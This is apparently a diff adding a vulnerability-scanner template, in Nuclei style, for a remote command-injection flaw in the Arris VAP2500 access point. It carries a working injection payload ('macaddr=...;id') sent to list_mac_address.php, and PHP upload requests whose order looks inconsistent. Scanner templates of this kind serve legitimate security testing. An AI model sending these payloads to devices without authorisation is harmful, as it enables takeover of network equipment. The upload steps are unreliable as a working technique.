@@ -1,0 +1,66 @@
+id: arris-vap2500-command-execution
+info:
+  name: Arris VAP2500 list_mac_address Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Arris VAP2500 is a wireless access point product. Attackers can exploit this vulnerability to execute arbitrary code on the server, install backdoors, gain server permissions, and control the web server.
+  reference:
+    - https://www.arris.com/
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+
+variables:
+  cmd_payload: "<?php echo \"test\"; ?>"
+  upload_payload: "filename=test.php&content={{url_encode(cmd_payload)}}"
+
+http:
+  - raw:
+      - |
+        POST /list_mac_address.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        macaddr=00:00:44:00:00:00;id&action=0&settype=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid="
+
+  - raw:
+      - |
+        GET /test.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test"
+
+  - raw:
+      - |
+        POST /test.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {{upload_payload}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: word
+        part: body
+        words:
+          - "test"
